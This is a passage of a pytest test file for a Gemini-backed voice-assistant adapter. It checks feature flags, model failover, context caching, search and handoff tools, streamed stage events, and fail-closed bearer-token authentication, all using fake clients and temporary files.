        is_lomin_vision_enabled,
    )

    for k in (
        "MVG_ENABLE_VISION",
        "MVG_VISION_ENABLED",
        "MVG_VISION_ADPCM",
        "MVG_ENABLE_ADPCM",
        "MVG_ADPCM_ENABLED",
        "MVG_BRAIN_DIRECT_AUDIO",
        "MVG_DIRECT_AUDIO",
        "MVG_HA_FASTPATH",
        "MVG_HA_ENABLED",
        "HA_CONVERSATION_ENABLED",
        "GOTCHI_HA_CONVERSATION_ENABLED",
        "MVG_ENABLE_MIC_REOPEN",
        "MVG_MIC_REOPEN_ENABLED",
        "MVG_ENABLE_DEFER",
        "MVG_DEFER_ENABLED",
    ):
        monkeypatch.delenv(k, raising=False)

    assert is_lomin_vision_enabled() is False
    monkeypatch.setenv("MVG_VISION_ENABLED", "1")
    assert is_lomin_vision_enabled() is True
    monkeypatch.delenv("MVG_VISION_ENABLED")
    monkeypatch.setenv("MVG_ENABLE_VISION", "1")
    assert is_lomin_vision_enabled() is True

    assert is_lomin_adpcm_enabled() is False
    monkeypatch.setenv("MVG_ADPCM_ENABLED", "1")
    assert is_lomin_adpcm_enabled() is True
    monkeypatch.delenv("MVG_ADPCM_ENABLED")
    monkeypatch.setenv("MVG_ENABLE_ADPCM", "1")
    assert is_lomin_adpcm_enabled() is True

    assert is_lomin_direct_audio_enabled() is False
    monkeypatch.setenv("MVG_DIRECT_AUDIO", "1")
    assert is_lomin_direct_audio_enabled() is True

    assert is_lomin_ha_fastpath_enabled() is False
    monkeypatch.setenv("MVG_HA_FASTPATH", "1")
    assert is_lomin_ha_fastpath_enabled() is True
    monkeypatch.delenv("MVG_HA_FASTPATH")
    monkeypatch.setenv("MVG_HA_ENABLED", "1")
    assert is_lomin_ha_fastpath_enabled() is True

    assert is_lomin_mic_reopen_enabled() is False
    monkeypatch.setenv("MVG_MIC_REOPEN_ENABLED", "1")
    assert is_lomin_mic_reopen_enabled() is True

    assert is_lomin_defer_enabled() is False
    monkeypatch.setenv("MVG_DEFER_ENABLED", "1")
    assert is_lomin_defer_enabled() is True


def test_resolve_live_gemini_model_never_downgrades_to_25_flash():
    adapter = GotchiZeroBrainAdapter(api_key="fake-key", dispatch_discord=False)
    assert adapter.model == "gemini-3.8-flash"
    assert adapter._resolve_live_gemini_model() == "gemini-3.8-flash"
    assert "2.5-flash" not in adapter._resolve_live_gemini_model()


def test_load_full_zero_persona_and_rules_in_voice_prompt():
    from tools.gotchi_zero_adapter import _load_full_zero_persona_and_rules

    block = _load_full_zero_persona_and_rules()
    assert "ZERO CORE OPERATIONAL REFERENCE (/workspace/GEMINI.md)" in block
    assert "ZERO MANDATORY OPERATIONAL RULES (/workspace/.agents/rules/*.md)" in block
    assert "RULE:" in block

    prompt = build_gotchi_zero_system_prompt("Check status", has_vision=False)
    assert "ZERO CORE OPERATIONAL REFERENCE (/workspace/GEMINI.md)" in prompt
    assert "ZERO MANDATORY OPERATIONAL RULES (/workspace/.agents/rules/*.md)" in prompt


def test_resolve_lomin_client_lockout_key_and_redteam_routes(monkeypatch):
    from tools.gotchi_zero_adapter import (
        resolve_lomin_client_lockout_key,
        shutdown_lomin_background_workers,
    )

    # 1. Proxy-safe client lockout key isolates distinct tokens/IPs behind 127.0.0.1
    k_bad_tok = resolve_lomin_client_lockout_key(
        {"Authorization": "Bearer bad-token-1"}, client_host="127.0.0.1"
    )
    k_good_tok = resolve_lomin_client_lockout_key(
        {"Authorization": "Bearer good-token-2"}, client_host="127.0.0.1"
    )
    k_xff_a = resolve_lomin_client_lockout_key(
        {"X-Forwarded-For": "198.51.100.10"}, client_host="127.0.0.1"
    )
    k_xff_b = resolve_lomin_client_lockout_key(
        {"X-Forwarded-For": "198.51.100.20"}, client_host="127.0.0.1"
    )
    assert k_bad_tok != k_good_tok
    assert k_xff_a != k_xff_b
    assert k_bad_tok != k_xff_a

    # 2. Lomin native routes (/ask, /ask/stream, /voice/pending, /voice/turn, /v1/audio/speech)
    # and empty body fallback
    monkeypatch.setenv("MVG_ENABLE_DEFER", "1")
    monkeypatch.setenv("MVG_ENABLE_MIC_REOPEN", "1")
    monkeypatch.setenv("GOTCHI_TTS_ENGINE", "mock")

    def fake_llm(turn: Dict[str, Any]) -> Dict[str, Any]:
        return {"reply": "All systems nominal. Would you like details?"}

    adapter = GotchiZeroBrainAdapter(llm_caller=fake_llm, dispatch_discord=False)
    app = create_zero_gotchi_app(adapter=adapter)
    client = TestClient(app)

    # Empty body on /ask and /voice/pending does not raise 500 JSONDecodeError
    empty_ask = client.post("/ask", content=b"")
    assert empty_ask.status_code == 200
    assert "event: reply" in empty_ask.text

    empty_pending = client.post("/voice/pending", content=b"")
    assert empty_pending.status_code == 400
    assert empty_pending.json()["error"] == "node_id required"

    # /ask sets expects_reply when mic reopen is enabled and reply ends with '?'
    ask_resp = client.post(
        "/ask",
        json={"node_id": "gotchi-lomin-01", "prompt": "Status check"},
    )
    assert ask_resp.status_code == 200
    assert "expects_reply" in ask_resp.text

    # Store pending item via Lomin pending store (or /voice/pending route fallback) and retrieve via /voice/pending/{node_id}
    try:
        from pending_and_auth import get_pending_store  # type: ignore

        get_pending_store().store(
            node_id="gotchi-lomin-01",
            prompt="Please defer this check",
            answer="Checking the build queue now.",
        )
    except ImportError:
        pend_post = client.post(
            "/voice/pending",
            json={
                "node_id": "gotchi-lomin-01",
                "prompt": "Please defer this check",
                "answer": "Checking the build queue now.",
            },
        )
        assert pend_post.status_code == 200
    pend_get = client.get("/voice/pending/gotchi-lomin-01")
    assert pend_get.status_code == 200
    pend_data = pend_get.json()
    assert pend_data["has_pending"] is True
    assert "Checking the build queue now." in pend_data["pending"]["answer"]

    # /ask/stream emits sentence and reply SSE events
    stream_resp = client.post(
        "/ask/stream",
        json={"node_id": "gotchi-lomin-01", "prompt": "Status check", "voice": False},
    )
    assert stream_resp.status_code == 200
    assert "event: sentence" in stream_resp.text
    assert "event: done" in stream_resp.text

    # /voice/turn supports JSON body
    vt_resp = client.post(
        "/voice/turn",
        json={"node_id": "gotchi-lomin-01", "prompt": "Quick turn check"},
    )
    assert vt_resp.status_code == 200
    assert "event: done" in vt_resp.text

    # /v1/audio/speech returns WAV audio
    tts_resp = client.post(
        "/v1/audio/speech",
        json={"input": "Zero voice online.", "response_format": "wav"},
    )
    assert tts_resp.status_code == 200
    assert tts_resp.content[:4] == b"RIFF"

    assert shutdown_lomin_background_workers(timeout_s=0.5) is True


def test_explicit_gemini_context_caching_lifecycle_and_fallback(monkeypatch):
    from tools.gotchi_zero_adapter import (
        build_gotchi_dynamic_turn_context,
        build_gotchi_static_system_instruction,
    )

    monkeypatch.setattr(
        "tools.gotchi_zero_adapter.outbox.queue_outbox_message",
        lambda *a, **kw: None,
    )
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter._append_voice_turn_to_history",
        lambda *a, **kw: None,
    )
    monkeypatch.setenv("GOTCHI_CONTEXT_CACHE_ENABLED", "1")
    monkeypatch.setenv("GOTCHI_CONTEXT_CACHE_TTL_SEC", "3600")

    static_prompt = build_gotchi_static_system_instruction()
    dynamic_ctx = build_gotchi_dynamic_turn_context("What is the weather?", has_vision=True)
    assert "GOTCHI & ZERO-VOICE UNIFIED PERSONA INVARIANTS" in static_prompt
    assert "ZERO CORE OPERATIONAL REFERENCE (/workspace/GEMINI.md)" in static_prompt
    assert "Current time:" in dynamic_ctx
    assert "live camera snapshot or 5-frame burst" in dynamic_ctx

    created_caches: List[Dict[str, Any]] = []
    recorded_gen_configs: List[Any] = []
    recorded_gen_contents: List[Any] = []

    class FakeCacheObj:
        def __init__(self, name: str):
            self.name = name

    class FakeCaches:
        def __init__(self, should_fail: bool = False):
            self.should_fail = should_fail
            self.counter = 0

        def create(self, model: str, config: Any) -> Any:
            if self.should_fail:
                raise RuntimeError("Context caching unsupported on this tier")
            self.counter += 1
            cname = f"cachedContents/gotchi-zero-cache-{self.counter}"
            created_caches.append({"model": model, "config": config, "name": cname})
            return FakeCacheObj(cname)

    class FakeChunk:
        def __init__(self, text: str = ""):
            self.text = text
            self.function_calls = None
            self.candidates = []

    class FakeModels:
        async def generate_content_stream(self, model: str, contents: Any, config: Any):
            recorded_gen_configs.append(config)
            recorded_gen_contents.append(contents)
            yield FakeChunk(text="Context cache active and verified.")

    class FakeAio:
        def __init__(self):
            self.models = FakeModels()

    class FakeGenaiClientWithCache:
        def __init__(self, should_fail: bool = False):
            self.caches = FakeCaches(should_fail=should_fail)
            self.aio = FakeAio()

    adapter = GotchiZeroBrainAdapter(api_key="fake-key", dispatch_discord=False)
    adapter._genai_client = FakeGenaiClientWithCache(should_fail=False)

    # 1. Turn 1 creates the cache and passes cached_content (omitting system_instruction & tools)
    reply1, _, _ = asyncio.run(
        adapter._run_gemini_with_tools(
            prompt="Check workshop status",
            image_bytes=None,
            burst_images=[],
        )
    )
    assert "Context cache active" in reply1
    assert len(created_caches) == 1
    assert created_caches[0]["name"] == "cachedContents/gotchi-zero-cache-1"
    cfg1 = recorded_gen_configs[-1]
    assert cfg1.cached_content == "cachedContents/gotchi-zero-cache-1"
    assert cfg1.system_instruction is None
    assert cfg1.tools is None
    first_user_text = recorded_gen_contents[-1][0].parts[0].text
    assert "Current time:" in first_user_text
    assert "Check workshop status" in first_user_text

    # 2. Turn 2 reuses the existing unexpired cache without calling caches.create again
    asyncio.run(
        adapter._run_gemini_with_tools(
            prompt="Second turn prompt",
            image_bytes=None,
            burst_images=[],
        )
    )
    assert len(created_caches) == 1
    assert recorded_gen_configs[-1].cached_content == "cachedContents/gotchi-zero-cache-1"

    # 3. Simulate TTL expiration -> Turn 3 refreshes the cache automatically
    adapter._cached_content_expires_at = time.monotonic() - 10.0
    asyncio.run(
        adapter._run_gemini_with_tools(
            prompt="Third turn after expiry",
            image_bytes=None,
            burst_images=[],
        )
    )
    assert len(created_caches) == 2
    assert recorded_gen_configs[-1].cached_content == "cachedContents/gotchi-zero-cache-2"

    # 4. Graceful fallback when caches.create raises an exception
    adapter_fail = GotchiZeroBrainAdapter(api_key="fake-key", dispatch_discord=False)
    adapter_fail._genai_client = FakeGenaiClientWithCache(should_fail=True)
    reply_fallback, _, _ = asyncio.run(
        adapter_fail._run_gemini_with_tools(
            prompt="Fallback turn",
            image_bytes=None,
            burst_images=[],
        )
    )
    assert "Context cache active" in reply_fallback
    cfg_fb = recorded_gen_configs[-1]
    assert cfg_fb.cached_content is None
    assert cfg_fb.system_instruction is not None
    assert cfg_fb.tools is not None


def test_web_search_mode_recency_fallback_and_clean_discord_turn_log(monkeypatch):
    import json
    from tools.gotchi_zero_adapter import (
        _build_gotchi_tools,
        _run_general_web_search,
        record_gotchi_turn_to_channels,
    )

    tools = _build_gotchi_tools()
    decls = {d.name: d for t in tools for d in (t.function_declarations or [])}
    assert "web_and_reddit_search" in decls
    web_props = decls["web_and_reddit_search"].parameters.properties
    assert "mode" in web_props
    assert "recency" in web_props

    # 1. Direct mode='web' calls _run_general_web_search
    monkeypatch.setattr(
        "tools.reddit_extractor._query_serpapi",
        lambda params: {
            "organic_results": [
                {
                    "title": "ESP32-S3 Datasheet",
                    "link": "https://example.com/esp32s3",
                    "snippet": "Dual-core XTensa LX7 MCU.",
                }
            ]
        },
    )
    web_direct = json.loads(_run_general_web_search("ESP32-S3 datasheet", limit=3))
    assert web_direct["count"] == 1
    assert web_direct["organic_results"][0]["title"] == "ESP32-S3 Datasheet"

    res_web = asyncio.run(
        execute_gotchi_tool_call(
            "web_and_reddit_search",
            {"query": "ESP32-S3 datasheet", "mode": "web"},
        )
    )
    assert "ESP32-S3 Datasheet" in res_web["result"]

    # 2. Automatic 'all'-time fallback when 1-year Reddit search returns '"count": 0'
    recorded_cmds: List[List[str]] = []

    class FakeProc:
        def __init__(self, stdout: str):
            self.stdout = stdout
            self.stderr = ""
            self.returncode = 0

    def fake_run(cmd, *a, **kw):
        recorded_cmds.append(list(cmd))
        if "--recency" in cmd and "all" in cmd:
            return FakeProc('{"count": 1, "items": [{"title": "All-time thread"}]}')
        return FakeProc('{"count": 0, "items": []}')

    monkeypatch.setattr("tools.gotchi_zero_adapter.subprocess.run", fake_run)
    res_fallback = asyncio.run(
        execute_gotchi_tool_call(
            "web_and_reddit_search",
            {"query": "rare vintage synth", "mode": "reddit"},
        )
    )
    assert len(recorded_cmds) == 2
    assert "--recency" in recorded_cmds[1] and "all" in recorded_cmds[1]
    assert "All-time thread" in res_fallback["result"]

    # 3. Clean Discord turn formatting without node_id / voice_name / session_id
    outbox_msgs: List[Any] = []
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter.outbox.queue_outbox_message",
        lambda ch, content, **kw: outbox_msgs.append((ch, content)),
    )
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter._append_voice_turn_to_history",
        lambda *a, **kw: None,
    )
    rec = record_gotchi_turn_to_channels(
        node_id="gotchi-ryan-01",
        session_id="sess-clean-99",
        transcript="What is the status?",
        reply="Everything is green.",
        stt_ms=110,
        first_audio_ms=420,
        total_ms=650,
        dispatch_discord=True,
    )
    msg = rec["discord_message"]
    assert "🎙️ **Ryan:** What is the status?" in msg
    assert "🔊 **Zero:** Everything is green." in msg
    assert "gotchi-ryan-01" not in msg
    assert "Schedar" not in msg
    assert "sess-clean-99" not in msg
    assert "-# stt: 110ms · first_audio: 420ms · total: 650ms" in msg


def test_skill_discovery_index_and_load_skill_playbook():
    from tools.gotchi_zero_adapter import (
        _build_gotchi_tools,
        _discover_skill_playbook_paths,
        _load_skills_index_summary,
        build_gotchi_static_system_instruction,
    )

    skills_map = _discover_skill_playbook_paths()
    unique_skill_files = {p.resolve() for p in skills_map.values()}
    assert len(unique_skill_files) >= 38

    index_summary = _load_skills_index_summary()
    assert "AVAILABLE ZERO SKILLS INDEX" in index_summary
    assert "whole-foods-cart" in index_summary
    assert "crontab-verify" in index_summary
    assert "forge-orchestrator" in index_summary

    static_sys = build_gotchi_static_system_instruction()
    assert "AVAILABLE ZERO SKILLS INDEX" in static_sys
    assert "load_skill_playbook" in static_sys
    assert "handoff_to_zero_runtime" in static_sys

    tools = _build_gotchi_tools()
    decls = {d.name: d for t in tools for d in (t.function_declarations or [])}
    assert "load_skill_playbook" in decls
    assert "handoff_to_zero_runtime" in decls

    # Load a workspace skill and a root CLI skill via load_skill_playbook
    wf_res = asyncio.run(
        execute_gotchi_tool_call("load_skill_playbook", {"skill_name": "whole-foods-cart"})
    )
    assert wf_res.get("skill_name") == "whole-foods-cart"
    assert "Whole Foods" in wf_res.get("content", "")

    cron_res = asyncio.run(
        execute_gotchi_tool_call("load_skill_playbook", {"skill_name": "crontab-verify"})
    )
    assert cron_res.get("skill_name") == "crontab-verify"
    assert "crontab" in cron_res.get("content", "").lower()

    # Also verify read_local_file allows /root/.gemini/antigravity-cli/skills/
    ok_cli_skill, _ = is_allowed_voice_read_path(
        "/root/.gemini/antigravity-cli/skills/crontab-verify/SKILL.md"
    )
    assert ok_cli_skill is True


def test_handoff_to_zero_runtime_and_defer_marker_wakes_zero_chat(monkeypatch):
    queued_turns: List[Dict[str, Any]] = []

    def fake_queue_agent_turn(channel: str, prompt: str, **kwargs: Any) -> Dict[str, Any]:
        entry = {"channel": str(channel), "prompt": prompt, **kwargs}
        queued_turns.append(entry)
        return {"id": "turn-1", "status": "pending", **entry}

    monkeypatch.setattr(
        "tools.gotchi_zero_adapter.outbox.queue_agent_turn",
        fake_queue_agent_turn,
    )
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter.outbox.queue_outbox_message",
        lambda *a, **kw: None,
    )
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter._append_voice_turn_to_history",
        lambda *a, **kw: None,
    )

    # 1. Direct tool execution of handoff_to_zero_runtime
    handoff_res = asyncio.run(
        execute_gotchi_tool_call(
            "handoff_to_zero_runtime",
            {
                "task_prompt": "Stage my Whole Foods cart from the family list and post the link.",
                "spoken_ack": "I'm staging your Whole Foods cart in Zero-Chat now.",
            },
        )
    )
    assert handoff_res["ok"] is True
    assert handoff_res["status"] == "handed_off_to_zero_runtime"
    assert len(queued_turns) == 1
    assert queued_turns[0]["prompt"].startswith("[GOTCHI VOICE HANDOFF]: Stage my Whole Foods cart")
    assert queued_turns[0].get("source") == "gotchi-voice-handoff"

    # 2. [[defer]] marker in voice reply automatically triggers queue_agent_turn into #zero-chat
    queued_turns.clear()

    def fake_defer_llm(_turn: Dict[str, Any]) -> Dict[str, Any]:
        return {
            "reply": "[[defer]] I am kicking off that multi-step build in Zero-Chat right now."
        }

    adapter = GotchiZeroBrainAdapter(llm_caller=fake_defer_llm, dispatch_discord=False)
    res = asyncio.run(
        adapter.handle_turn(
            {
                "node_id": "gotchi-ryan-01",
                "session_id": "sess-defer-handoff",
                "prompt": "Run the full CAD render and slice the enclosure.",
            }
        )
    )
    assert "I am kicking off that multi-step build" in res["reply"]
    assert "[[defer]]" not in res["reply"]
    assert res["sent_to_zero_chat"] is True
    assert len(queued_turns) == 1
    assert "[GOTCHI VOICE HANDOFF]: Run the full CAD render and slice the enclosure." in queued_turns[0]["prompt"]


def test_contextual_tool_stage_events_and_multistep_progress_streaming(monkeypatch):
    import sys
    import types as py_types
    from typing import Optional, Tuple
    from tools.gotchi_zero_adapter import (
        GotchiZeroBrainAdapter,
        brain_call_stream,
        build_contextual_tool_filler,
        format_voice_turn_prefix,
    )

    monkeypatch.setattr(
        "tools.gotchi_zero_adapter.outbox.queue_outbox_message",
        lambda *a, **kw: None,
    )
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter._append_voice_turn_to_history",
        lambda *a, **kw: None,
    )
    monkeypatch.setenv("GOTCHI_CONTEXT_CACHE_ENABLED", "0")

    executed_tools: List[Tuple[str, Dict[str, Any]]] = []

    async def fake_execute_tool(name: str, args: Dict[str, Any], **kwargs: Any) -> Dict[str, Any]:
        executed_tools.append((name, dict(args)))
        if name == "check_tasks_and_repos":
            return {"result": "Open PR #142 in brockventures/gotchi"}
        if name == "read_local_file":
            return {"content": "Build status: green"}
        if name == "get_weather_forecast":
            return {"forecast": "68F and clear"}
        return {"ok": True}

    monkeypatch.setattr(
        "tools.gotchi_zero_adapter.execute_gotchi_tool_call",
        fake_execute_tool,
    )

    # Set up a fake stage_events module to verify stage_events.emit_stage is invoked
    emitted_lomin_stages: List[Dict[str, Any]] = []
    fake_stage_events_mod = py_types.ModuleType("stage_events")

    def fake_emit_stage(*args: Any, **kwargs: Any) -> None:
        if kwargs:
            emitted_lomin_stages.append(dict(kwargs))
        elif len(args) >= 2:
            emitted_lomin_stages.append({"stage": args[0], "detail": args[1]})
        elif len(args) == 1 and isinstance(args[0], dict):
            emitted_lomin_stages.append(dict(args[0]))

    fake_stage_events_mod.emit_stage = fake_emit_stage  # type: ignore[attr-defined]
    monkeypatch.setitem(sys.modules, "stage_events", fake_stage_events_mod)

    class FakeFunctionCall:
        def __init__(self, name: str, args: Dict[str, Any]):
            self.name = name
            self.args = args

    class FakeChunk:
        def __init__(
            self,
            text: str = "",
            function_calls: Optional[List[Any]] = None,
        ):
            self.text = text
            self.function_calls = function_calls
            self.candidates = []

    # Case 1: Multi-step tool turn where step 0 calls a tool without text, step 1 emits
    # intermediate progress text ("I checked the open PRs, now reading the status log.")
    # and calls a second tool, and step 2 emits the final answer.
    class MultiStepModelsWithIntermediateText:
        def __init__(self):
            self.call_count = 0

        async def generate_content_stream(self, model: str, contents: Any, config: Any):
            step_idx = self.call_count
            self.call_count += 1
            if step_idx == 0:
                yield FakeChunk(
                    text="",
                    function_calls=[
                        FakeFunctionCall("check_tasks_and_repos", {"repo_or_filter": "gotchi"})
                    ],
                )
            elif step_idx == 1:
                yield FakeChunk(
                    text="I found open PR 142, now checking the local build log.",
                    function_calls=[
                        FakeFunctionCall("read_local_file", {"file_path": "/workspace/data/tasks.json"})
                    ],
                )
            else:
                yield FakeChunk(
                    text="PR 142 is open and the local build log is completely green.",
                    function_calls=None,
                )

    class FakeAio:
        def __init__(self, models_impl: Any):
            self.models = models_impl

    class FakeGenaiClient:
        def __init__(self, models_impl: Any):
            self.aio = FakeAio(models_impl)

    adapter = GotchiZeroBrainAdapter(api_key="fake-key", dispatch_discord=False)
    adapter._genai_client = FakeGenaiClient(MultiStepModelsWithIntermediateText())

    streamed_sentences: List[str] = []
    stage_cb_events: List[Dict[str, Any]] = []
    tool_start_events: List[Tuple[str, str, str]] = []
    stages_out: Dict[str, Any] = {}

    def on_tool_cb(stage: str = "tool", tool: str = "", detail: str = "", **kw: Any) -> None:
        tool_start_events.append((stage, tool, detail))

    def on_stage_cb(ev: Dict[str, Any]) -> None:
        stage_cb_events.append(dict(ev))

    res = asyncio.run(
        adapter.handle_turn(
            {
                "node_id": "gotchi-ryan-01",
                "session_id": "sess-multistep-1",
                "prompt": "Check the tasks and build log.",
                "_on_sentence": streamed_sentences.append,
                "_on_tool_start": on_tool_cb,
                "on_stage": on_stage_cb,
                "stages_out": stages_out,
            }
        )
    )

    # Both step 0 and step 1 tool calls must trigger stage callbacks and stages_out
    assert len(executed_tools) == 2
    assert [t[0] for t in executed_tools] == ["check_tasks_and_repos", "read_local_file"]

    assert len(tool_start_events) == 2
    assert tool_start_events[0][0] == "tool"
    assert tool_start_events[0][1] == "check_tasks_and_repos"
    assert tool_start_events[0][2] == build_contextual_tool_filler(
        "check_tasks_and_repos", {"repo_or_filter": "gotchi"}, format_voice_turn_prefix(node_id="gotchi-ryan-01", speaker="ryan") + "\nCheck the tasks and build log."
    )
    assert tool_start_events[1][0] == "tool"
    assert tool_start_events[1][1] == "read_local_file"

    assert len(stage_cb_events) == 2
    assert stage_cb_events[0]["stage"] == "tool"
    assert stage_cb_events[0]["tool"] == "check_tasks_and_repos"
    assert stage_cb_events[1]["stage"] == "tool"
    assert stage_cb_events[1]["tool"] == "read_local_file"

    assert "events" in stages_out
    assert len(stages_out["events"]) == 2
    assert stages_out["events"][0]["stage"] == "tool"
    assert stages_out["events"][0]["tool"] == "check_tasks_and_repos"
    assert stages_out["events"][1]["stage"] == "tool"
    assert stages_out["events"][1]["tool"] == "read_local_file"

    assert len(emitted_lomin_stages) == 2
    assert emitted_lomin_stages[0]["stage"] == "tool"
    assert emitted_lomin_stages[0]["tool"] == "check_tasks_and_repos"
    assert emitted_lomin_stages[1]["tool"] == "read_local_file"

    # Streamed sentences must include:
    # 1) Step 0 pre-tool contextual filler
    # 2) Step 1 intermediate progress text ("I found open PR 142, now checking the local build log.")
    # 3) Step 2 final synthesis ("PR 142 is open and the local build log is completely green.")
    assert len(streamed_sentences) == 3
    assert any("found open pr 142" in s.lower() for s in streamed_sentences)
    assert "pr 142 is open and the local build log is completely green." in streamed_sentences[-1].lower()
    assert "pr 142 is open" in res["reply"].lower()

    # Case 2: Multi-step tool turn where step 1 calls a subsequent tool WITHOUT intermediate text
    # -> must emit contextual tool filler for the step 1 tool via _emit_streamed_sentence, and
    #    test brain_call_stream(stages_out=...) forwarding.
    class MultiStepModelsSilentStep1:
        def __init__(self):
            self.call_count = 0

        async def generate_content_stream(self, model: str, contents: Any, config: Any):
            step_idx = self.call_count
            self.call_count += 1
            if step_idx == 0:
                yield FakeChunk(
                    text="",
                    function_calls=[
                        FakeFunctionCall("check_tasks_and_repos", {"repo_or_filter": "gotchi"})
                    ],
                )
            elif step_idx == 1:
                yield FakeChunk(
                    text="",
                    function_calls=[
                        FakeFunctionCall("get_weather_forecast", {"location": "Seattle"})
                    ],
                )
            else:
                yield FakeChunk(
                    text="Tasks are clear and Seattle is 68 degrees.",
                    function_calls=None,
                )

    monkeypatch.setattr(
        GotchiZeroBrainAdapter,
        "_get_genai_client",
        lambda self: FakeGenaiClient(MultiStepModelsSilentStep1()),
    )

    partials: List[str] = []
    stream_stages_out: Dict[str, Any] = {}
    stream_reply = brain_call_stream(
        "gotchi-ryan-01",
        "Check tasks and weather.",
        timeout=30,
        on_partial=partials.append,
        stages_out=stream_stages_out,
    )
    assert "seattle is 68 degrees" in stream_reply.lower()
    assert len(stream_stages_out.get("events", [])) == 2
    assert stream_stages_out["events"][0]["tool"] == "check_tasks_and_repos"
    assert stream_stages_out["events"][1]["tool"] == "get_weather_forecast"
    # Verify step 0 filler, step 1 weather filler, and step 2 final reply were all streamed via on_partial
    assert len(partials) >= 3
    assert any("weather" in p.lower() or "forecast" in p.lower() or "conditions" in p.lower() for p in partials)


def test_stream_failover_and_tts_use_non_deprecated_models(monkeypatch):
    import asyncio
    from tools.gotchi_zero_adapter import (
        GotchiZeroBrainAdapter,
        create_zero_gotchi_app,
        shutdown_lomin_background_workers,
    )

    monkeypatch.setattr(
        "tools.gotchi_zero_adapter.outbox.queue_outbox_message",
        lambda *a, **kw: None,
    )
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter._append_voice_turn_to_history",
        lambda *a, **kw: None,
    )

    attempted_models: List[str] = []

    class FakeChunk:
        def __init__(self, text: str = ""):
            self.text = text
            self.function_calls = None
            self.candidates = []

    class FailoverModels:
        async def generate_content_stream(self, model: str, contents: Any, config: Any):
            attempted_models.append(model)
            if model == "gemini-3.8-flash":
                raise RuntimeError("503 UNAVAILABLE")
            yield FakeChunk(text="Fallback model answered cleanly.")

    class FakeAio:
        def __init__(self):
            self.models = FailoverModels()

    class FakeClient:
        def __init__(self):
            self.aio = FakeAio()
            self.caches = None

    adapter = GotchiZeroBrainAdapter(api_key="fake-key", dispatch_discord=False)
    monkeypatch.setattr(adapter, "_get_genai_client", lambda: FakeClient())
    monkeypatch.setattr(adapter, "_get_or_create_context_cache", lambda *a, **kw: None)

    reply, _, _ = asyncio.run(
        adapter._run_gemini_with_tools("Quick status check.", None, [])
    )
    assert "Fallback model answered cleanly." in reply
    assert attempted_models == ["gemini-3.8-flash", "gemini-3.1-flash-lite-preview"]
    assert all("2.5-flash" not in m and "2.0-flash" not in m for m in attempted_models)

    # Verify create_zero_gotchi_app defaults cfg.tts_model to gemini-3.1-flash-tts-preview
    monkeypatch.delenv("GOTCHI_TTS_ENGINE", raising=False)
    monkeypatch.delenv("GOTCHI_TTS_MODEL", raising=False)
    monkeypatch.delenv("MVG_TTS", raising=False)

    from backend import llm_config as llm_cfg_mod

    orig_from_env = llm_cfg_mod.LLMConfig.from_env_or_file
    captured_cfgs: List[Any] = []

    def _wrapped_from_env(*args, **kwargs):
        cfg = orig_from_env(*args, **kwargs)
        cfg.tts_url = ""
        captured_cfgs.append(cfg)
        return cfg

    monkeypatch.setattr(llm_cfg_mod.LLMConfig, "from_env_or_file", _wrapped_from_env)
    create_zero_gotchi_app(adapter=adapter, live_mode_enabled=False)
    assert len(captured_cfgs) == 1
    assert captured_cfgs[0].tts_model == "gemini-3.1-flash-tts-preview"
    assert "2.5-flash" not in captured_cfgs[0].tts_model
    shutdown_lomin_background_workers(timeout_s=0.5)


def test_verify_gotchi_bearer_fallback_sources(monkeypatch, tmp_path):
    import json

    from tools import gotchi_zero_adapter as adapter_mod

    token_file = tmp_path / "gotchi_bearer_token.json"
    secrets_file = tmp_path / "env.json"
    monkeypatch.setattr(adapter_mod, "_GOTCHI_BEARER_TOKEN_FILE", token_file)
    monkeypatch.setattr(adapter_mod, "_SECRETS_ENV_FILE", secrets_file)
    monkeypatch.delenv("GOTCHI_BEARER_TOKEN", raising=False)

    # Fail-closed when no token source exists
    assert adapter_mod._verify_gotchi_bearer_fallback("") is False
    assert adapter_mod._verify_gotchi_bearer_fallback("Bearer ") is False
    assert adapter_mod._verify_gotchi_bearer_fallback("Bearer any-token") is False

    # 1. File source: /workspace/data/gotchi_bearer_token.json
    token_file.write_text(json.dumps({"token": "file-token-alpha"}), encoding="utf-8")
    assert adapter_mod._verify_gotchi_bearer_fallback("Bearer file-token-alpha") is True
    assert adapter_mod._verify_gotchi_bearer_fallback("bearer file-token-alpha") is True
    assert adapter_mod._verify_gotchi_bearer_fallback("file-token-alpha") is True
    assert adapter_mod._verify_gotchi_bearer_fallback("Bearer wrong-token") is False
    assert adapter_mod._verify_gotchi_bearer_fallback("Bearer") is False

    # 2. Secrets source: /secrets/env.json (GOTCHI_BEARER_TOKEN)
    secrets_file.write_text(json.dumps({"GOTCHI_BEARER_TOKEN": "secrets-token-beta"}), encoding="utf-8")
    assert adapter_mod._verify_gotchi_bearer_fallback("Bearer secrets-token-beta") is True
    assert adapter_mod._verify_gotchi_bearer_fallback("secrets-token-beta") is True

    # 3. Environment variable source: GOTCHI_BEARER_TOKEN
    monkeypatch.setenv("GOTCHI_BEARER_TOKEN", "env-token-gamma")
    assert adapter_mod._verify_gotchi_bearer_fallback("Bearer env-token-gamma") is True
    assert adapter_mod._verify_gotchi_bearer_fallback("env-token-gamma") is True
    assert adapter_mod._verify_gotchi_bearer_fallback("Bearer not-valid") is False


def test_gotchi_brain_endpoint_auth_and_cloudflare_fail_closed(monkeypatch, tmp_path):
    from tools import gotchi_zero_adapter as adapter_mod
    from tools.gotchi_zero_adapter import shutdown_lomin_background_workers

    # Isolate from host token files and external env vars
    monkeypatch.setattr(adapter_mod, "_GOTCHI_BEARER_TOKEN_FILE", tmp_path / "missing_token.json")
    monkeypatch.setattr(adapter_mod, "_SECRETS_ENV_FILE", tmp_path / "missing_env.json")
    monkeypatch.delenv("GOTCHI_BEARER_TOKEN", raising=False)
    monkeypatch.delenv("GOTCHI_DEVICE_TOKENS", raising=False)
    monkeypatch.delenv("MVG_DEVICE_TOKENS", raising=False)
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter.outbox.queue_outbox_message",
        lambda *a, **kw: None,
    )
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter._append_voice_turn_to_history",
        lambda *a, **kw: None,
    )

    brain_calls: list[dict[str, Any]] = []

    def fake_llm(turn: dict[str, Any]) -> dict[str, Any]:
        brain_calls.append(dict(turn))
        return {"reply": "Brain turn executed safely."}

